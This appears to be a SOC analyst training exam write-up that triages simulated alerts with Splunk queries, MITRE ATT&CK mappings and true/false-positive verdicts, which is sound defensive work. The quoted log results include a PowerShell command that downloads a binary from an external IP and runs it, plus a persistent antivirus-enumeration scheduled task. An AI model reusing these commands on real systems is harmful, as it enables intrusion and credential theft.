# Investigation — Case 019 (Final Exam, Stage 1)

**Methodology note:** Time-pressure target of ~2-3 minutes per alert was enforced throughout this case, consistent with the Final Exam's goal of testing performance under realistic queue speed rather than unlimited investigation time.

---

## Prioritization Decision (Opening Queue)

**Chosen order: BA → BB → BD → BC → BF → BE**

**Justification:**
- **BA first** — active download-and-execute of an unsigned binary from an external IP; the most severe, currently-executing threat.
- **BB second** — Tor exit node login is a strong credential-compromise/anonymized-access indicator.
- **BD third** — high-volume DNS TXT queries can indicate active data exfiltration in progress.
- **BC fourth** — AV-enumeration via persistent scheduled task is recon/evasion-adjacent but not actively executing harm.
- **BF fifth** — stopping Windows Update is a lower-severity, more ambiguous-leaning action.
- **BE last** — a cosmetic AD attribute change carries the lowest risk of the six.

---

## Alert BA — PowerShell Download-and-Execute of Unsigned Binary

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*powershell.exe" Process_Command_Line="*svc.exe*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```
**Result:** `Invoke-WebRequest -Uri http://91.242.217.88/svc.exe -OutFile C:\Windows\Temp\svc.exe; Start-Process C:\Windows\Temp\svc.exe`, parent `cmd.exe`.

**Findings:** Download from raw external IP followed immediately by execution (`Start-Process`) of the unsigned binary in a Temp path — confirmed ingress (T1105) plus execution (T1204.002-adjacent). Decisive on content alone.

**Verdict: 🔴 TP — T1105, T1204.002**

---

## Alert BB — Login from Tor Exit Node

**Given Data:** `Login event: account hp, source IP 185.220.100.240 (known Tor exit node), Logon_Type 3 (Network)`

**Findings:** A successful network logon originating from a documented Tor exit node has no legitimate everyday justification for this account — Tor is used specifically to anonymize/obscure the true source of a connection, a pattern strongly associated with unauthorized access.

**Verdict: 🔴 TP — T1078 (Valid Accounts), T1090 (Proxy, relevant to Tor usage)**

---

## Alert BD — High-Volume DNS TXT Queries

**Given Data (EDR):** `340 TXT record queries in 5 minutes to *.datasync-cloud.net`

**Findings:** Initial assessment leaned Ambiguous based on the domain appearing plausible/legitimate-sounding. Corrected: the query **volume and rate** (over one query per second, sustained, specifically targeting TXT records) has no legitimate browsing, update, or application explanation at this scale, and is a well-documented DNS tunneling/exfiltration pattern (T1071.004/T1048.003). The domain sounding legitimate does not offset this — attackers routinely register plausible-sounding domains to blend in. Volume/rate alone is decisive here, consistent with the reasoning applied to Case_006's password-spray volume.

**Verdict: 🔴 TP — T1071.004, T1048.003**

---

## Alert BC — Persistent AV-Enumeration Scheduled Task

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*schtasks.exe"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```
**Result:** `schtasks /create /tn "SysCheck" /tr "wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName" /sc onlogon`, parent `cmd.exe`.

**Findings:** Initial assessment leaned Ambiguous. Corrected: this combines Security Software Discovery (T1518.001 — malware routinely enumerates installed AV before deploying payloads) with **persistence via a logon-triggered scheduled task** — not a one-time check, but infrastructure set up to repeatedly re-check AV status. No standard user has a legitimate reason to persistently enumerate their own antivirus via a recurring scheduled task. The persistence + recon-specific technique combination is decisive, mirroring the reasoning applied to Case_007 and Case_015's Alert T.

**Verdict: 🔴 TP — T1518.001, T1053.005**

---

## Alert BF — Windows Update Service Stopped

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*net.exe" Process_Command_Line="*wuauserv*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```
**Result:** `net stop wuauserv`, parent `cmd.exe`.

**Findings:** Initial assessment leaned Ambiguous. Corrected: stopping Windows Update is a common, everyday action (avoiding forced reboots, managing bandwidth, troubleshooting) with no aggravating factors present (no persistence, no encoding, no privilege escalation). Unlike Defender or audit-logging disables (security controls with no everyday use case), Windows Update is routine software patching users commonly pause — the underlying service type matters as much as the action of stopping it.

**Verdict: 🟢 FP**

---

## Alert BE — AD Display Name Change

**Given Data:** `displayName modified from "Jimil Joshi" to "J. Joshi", Account: hp, Time: 10:00 AM`

**Findings:** A cosmetic display-name change carries no security implication — no privilege, access, or capability change. Zero aggravating factors present, comparable to the Chrome-extension FP pattern (Case_018's Alert AH) but even more benign.

**Verdict: 🟢 FP**

---

## Alert BG — Mid-Stage Interrupt: Confirmed Mimikatz Process

**Given Data (EDR):** `Mimikatz-signature process actively running, Host: JIMIL-JOSHI, Severity: Critical`

**Findings:** This directly confirms and extends Alert BA — the `svc.exe` downloaded and executed in BA has been identified by EDR as an active Mimikatz-signature process. This is not a separate incident; it is confirmation that the BA download-execute chain has already resulted in a live credential-theft tool running on the host. This elevates BA's response posture from "escalate for review" to "active incident, isolate immediately."

**Verdict: 🔴 TP — T1003 (OS Credential Dumping), directly correlated with Alert BA**

---

## Summary Table

| Alert | Verdict | MITRE | Notes |
|---|---|---|---|
| BA | 🔴 TP | T1105, T1204.002 | Confirmed by BG as part of active chain |
| BB | 🔴 TP | T1078, T1090 | — |
| BD | 🔴 TP | T1071.004, T1048.003 | Corrected from initial Ambiguous lean |
| BC | 🔴 TP | T1518.001, T1053.005 | Corrected from initial Ambiguous lean |
| BF | 🟢 FP | — | Corrected from initial Ambiguous lean |
| BE | 🟢 FP | — | Corrected from initial TP call |
| BG | 🔴 TP | T1003 | Direct confirmation/extension of BA |
